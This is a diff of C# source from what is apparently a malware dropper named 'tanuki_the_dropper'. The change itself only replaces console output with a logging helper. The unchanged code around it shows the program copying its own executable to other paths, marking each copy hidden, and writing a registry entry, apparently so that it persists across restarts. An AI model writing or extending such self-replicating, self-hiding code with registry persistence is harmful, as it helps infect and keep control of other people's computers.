@@ -11,6 +11,8 @@ namespace tanuki_the_dropper
 
         public void SelfCopy()
         {
+            Utility.ConsoleLog("Start replication.");
+
             string currentCopy = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
 
             if (currentCopy == null) { return; }
@@ -27,20 +29,21 @@ namespace tanuki_the_dropper
                         try
                         {
                             File.Copy(currentCopy, copy, true);
+                            Utility.ConsoleLog($"Copied successfully in {copy}.");
 
                             try
                             {
                                 File.SetAttributes(copy, File.GetAttributes(copy) | FileAttributes.Hidden);
-                                Console.WriteLine("Hidden attribute set for file: " + copy);
+                                Utility.ConsoleLog("Hidden attribute set for file.");
                             }
                             catch (Exception ex)
                             {
-                                Console.WriteLine("Error setting hidden attribute for file: " + ex.Message);
+                                Utility.ConsoleLog("Error setting hidden attribute for file: " + ex.Message);
                             }
                         }
                         catch (Exception ex)
                         {
-                            Console.WriteLine("Failed to copy: " + ex.Message);
+                            Utility.ConsoleLog("Failed to copy: " + ex.Message);
                         }
 
                         EditRegister(copy);
@@ -62,10 +65,12 @@ namespace tanuki_the_dropper
                 registryKey.SetValue(keyName, value);
 
                 registryKey.Close();
+
+                Utility.ConsoleLog($"Added register entry for {value}");
             }
             catch (Exception ex)
             {
-                Console.WriteLine("Could not add program to registry: " + ex.Message);
+                Utility.ConsoleLog($"Error adding program to registry.");
             }
         }
     }
